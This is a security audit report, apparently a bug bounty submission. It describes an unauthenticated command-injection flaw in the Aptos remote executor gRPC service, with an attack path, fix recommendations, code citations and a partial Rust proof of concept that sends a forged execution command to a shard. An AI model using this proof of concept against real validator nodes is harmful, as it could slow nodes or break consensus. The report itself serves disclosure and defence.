# Audit Report

## Title
Unauthenticated Command Injection in Remote Executor Service Allows Arbitrary Block Execution

## Summary
The Remote Executor Service accepts and processes `ExecutorShardCommand` messages from any network peer without authentication or authorization checks. An attacker who can reach the GRPC server port can inject arbitrary execution commands to executor shards, potentially causing consensus violations, resource exhaustion, and validator slowdowns.

## Finding Description
The vulnerability exists in the remote executor service architecture, which enables distributed block execution across multiple executor shards. The security flaw spans multiple components:

**1. Unauthenticated GRPC Server**

The GRPC server accepts `NetworkMessage` from any remote peer without validating the sender's identity or authority: [1](#0-0) 

The server routes messages solely based on `message_type` with no authentication layer.

**2. Predictable Message Routing**

Executor shards register handlers for predictable message types during initialization: [2](#0-1) 

Message types follow the pattern `"execute_command_{shard_id}"`, making them trivially discoverable.

**3. Blind Command Processing**

The `receive_execute_command()` function deserializes and processes commands without authorization checks: [3](#0-2) 

The local implementation similarly accepts commands from channels without validation: [4](#0-3) 

**Attack Path:**

1. Attacker identifies executor shard network endpoints (discoverable via network scanning or configuration leaks)
2. Crafts malicious `ExecuteBlockCommand` containing arbitrary transactions or resource-intensive operations
3. Serializes the command using BCS format as `RemoteExecutionRequest::ExecuteBlock`
4. Sends `NetworkMessage` via GRPC with `message_type="execute_command_0"` (or other shard IDs)
5. GRPC server routes message to registered handler without authentication
6. `RemoteCoordinatorClient` deserializes and converts to `ExecutorShardCommand::ExecuteSubBlocks`
7. Executor shard processes the malicious command as if it came from the legitimate coordinator

**Broken Invariants:**

- **Deterministic Execution**: Different shards may receive different commands from attackers vs. legitimate coordinator, causing state divergence
- **Access Control**: No validation that commands originate from authorized coordinator
- **Consensus Safety**: Inconsistent execution across shards violates consensus assumptions

## Impact Explanation
This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria:

- **Validator node slowdowns**: Attacker can flood executor shards with computationally expensive commands, degrading performance
- **Significant protocol violations**: Injecting unauthorized commands violates the fundamental assumption that only the authorized coordinator directs shard execution
- **Potential consensus violations**: If different shards receive conflicting commands, they may produce different state roots, breaking deterministic execution guarantees

While the vulnerability requires network access to executor shard ports, the complete absence of authentication/authorization represents a critical security control failure in consensus-critical infrastructure.

## Likelihood Explanation
**Likelihood: Medium to High** (deployment-dependent)

**Factors increasing likelihood:**
- No authentication required - any network peer can exploit
- Predictable attack surface (message types, port numbers)
- Simple exploitation - standard GRPC client + BCS serialization
- Production usage confirmed: [5](#0-4) 

**Factors decreasing likelihood:**
- Remote executor service may be deployed only on internal/trusted networks
- Network-level firewalls may restrict access
- Feature requires explicit configuration via `set_remote_addresses()`

However, reliance on network-level security without code-level defense-in-depth is a dangerous anti-pattern. A single misconfiguration (exposed port, cloud security group error, VPN compromise) makes this immediately exploitable.

## Recommendation
Implement multi-layer authentication and authorization:

**1. Add TLS mutual authentication to NetworkController**

Replace plain TCP with TLS connections requiring client certificates. Modify the GRPC server to validate client identities against a whitelist of authorized coordinators and shards.

**2. Add message-level authentication**

Include signed authentication tokens in `NetworkMessage` that prove the sender's identity and authority. The token should include:
- Sender identity (coordinator or specific shard ID)
- Timestamp (to prevent replay attacks)
- Signature using the sender's private key

**3. Implement command authorization**

In `RemoteCoordinatorClient::receive_execute_command()`, verify that:
- Messages originate from the expected coordinator address
- Command sequence numbers prevent replay attacks
- Commands are properly signed by the coordinator

**Example code fix for message authentication (pseudocode):**

```rust
// In RemoteCoordinatorClient::receive_execute_command()
fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
    match self.command_rx.recv() {
        Ok(message) => {
            // ADDED: Verify message signature
            let signed_request: SignedRemoteExecutionRequest = 
                bcs::from_bytes(&message.data).unwrap();
            
            if !self.verify_coordinator_signature(&signed_request) {
                error!("Unauthorized command from non-coordinator");
                return ExecutorShardCommand::Stop;
            }
            
            let request = signed_request.into_inner();
            // ... rest of existing code
        }
    }
}
```

**4. Network-level hardening**

While not sufficient alone, implement defense-in-depth:
- Bind executor services only to private interfaces
- Use network policies/firewalls to restrict access
- Document security requirements clearly

## Proof of Concept

```rust
// PoC: Unauthorized command injection to remote executor shard
// Compile with: cargo build --example remote_executor_attack

use aptos_secure_net::network_controller::Message;
use aptos_executor_service::{ExecuteBlockCommand, RemoteExecutionRequest};
use aptos_types::block_executor::{
    config::BlockExecutorConfigFromOnchain,
    partitioner::SubBlocksForShard,
};
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tonic::Request;

#[tokio::main]
async fn main() {
    // Target executor shard 0 at known/discovered address
    let target_shard = "http://executor-shard-0.internal:50051";
    
    // Connect to GRPC server (NO AUTHENTICATION REQUIRED)
    let mut client = NetworkMessageServiceClient::connect(target_shard)
        .await
        .expect("Failed to connect");
    
    // Craft malicious command (e.g., resource-intensive transactions)
    let malicious_command = ExecuteBlockCommand {
        sub_blocks: create_malicious_subblocks(), // Helper function
        concurrency_level: 1,
        onchain_config: BlockExecutorConfigFromOnchain::default(),
    };
    
    // Wrap in RemoteExecutionRequest
    let request = RemoteExecutionRequest::ExecuteBlock(malicious_command);
    
    // Serialize with BCS
    let payload = bcs::to_bytes(&request).unwrap();
    
    // Send via GRPC with predictable message type
    let network_message = NetworkMessage {
        message: payload,
        message_type: "execute_command_0".to_string(), // Predictable!
    };
    
    // Execute attack - server accepts without auth
    let response = client
        .simple_msg_exchange(Request::new(network_message))
        .await;
    
    println!("Command injection succeeded: {:?}", response.is_ok());
}

fn create_malicious_subblocks() -> SubBlocksForShard<AnalyzedTransaction> {
    // Create resource-intensive or conflicting transactions
    // to cause slowdowns or consensus divergence
    todo!("Craft malicious transaction payload")
}
```

**Notes**
This vulnerability affects the remote executor service architecture used for distributed block execution. While the service may not be enabled in all deployments, its presence in production code paths without proper authentication represents a significant security gap. The complete absence of authentication/authorization checks violates security best practices for distributed systems handling consensus-critical operations.

The fix requires implementing proper authentication at both the network transport layer (TLS mutual auth) and application layer (message signing), along with clear documentation of security requirements for deployment.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L32-36)
```rust
        let execute_command_type = format!("execute_command_{}", shard_id);
        let execute_result_type = format!("execute_result_{}", shard_id);
        let command_rx = controller.create_inbound_channel(execute_command_type);
        let result_tx =
            controller.create_outbound_channel(coordinator_address, execute_result_type);
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L80-112)
```rust
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);

                match request {
                    RemoteExecutionRequest::ExecuteBlock(command) => {
                        let init_prefetch_timer = REMOTE_EXECUTOR_TIMER
                            .with_label_values(&[&self.shard_id.to_string(), "init_prefetch"])
                            .start_timer();
                        let state_keys = Self::extract_state_keys(&command);
                        self.state_view_client.init_for_block(state_keys);
                        drop(init_prefetch_timer);

                        let (sub_blocks, concurrency, onchain_config) = command.into();
                        ExecutorShardCommand::ExecuteSubBlocks(
                            self.state_view_client.clone(),
                            sub_blocks,
                            concurrency,
                            onchain_config,
                        )
                    },
                }
            },
            Err(_) => ExecutorShardCommand::Stop,
        }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/local_executor_shard.rs (L260-262)
```rust
    fn receive_execute_command(&self) -> ExecutorShardCommand<S> {
        self.command_rx.recv().unwrap()
    }
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L261-267)
```rust
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
```
